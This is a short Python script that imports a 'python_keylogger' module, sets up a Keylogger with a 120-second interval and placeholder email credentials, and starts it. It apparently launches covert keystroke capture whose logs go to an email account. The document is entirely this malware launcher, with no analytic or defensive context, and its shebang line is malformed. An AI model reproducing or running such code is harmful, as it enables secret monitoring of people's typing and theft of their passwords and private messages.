#!/usr/bin/bin python
import python_keylogger

# Object     = Name of the File.Class_Name()
my_keylogger = python_keylogger.Keylogger(120, "$Email", "$PASS")
my_keylogger.start()
